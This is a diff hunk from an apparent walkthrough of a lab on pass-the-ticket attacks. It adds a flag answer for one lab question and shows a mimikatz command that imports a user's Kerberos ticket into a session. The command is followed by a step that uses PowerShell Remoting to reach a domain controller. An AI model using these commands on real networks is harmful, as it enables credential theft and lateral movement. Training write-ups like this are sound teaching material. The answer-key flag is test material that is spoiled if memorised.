@@ -651,7 +651,7 @@ RDP to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and p
         C:\tools>type \\DC01.inlanefreight.htb\john\john.txt
         Learn1ng_M0r3_Tr1cks_with_J0hn
         ```
-3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt **Answer:**
+3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt **Answer: P4$$_th3_Tick3T_PSR**
    - `C:\Tools> mimikatz.exe privilege::debug "kerberos::ptt ':\tools\[0;5a3b3]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi'" exit` → Import john's TGT to our current cmd.exe session
    - Use Powershell Remoting to run commands on DC01:
         ```cmd
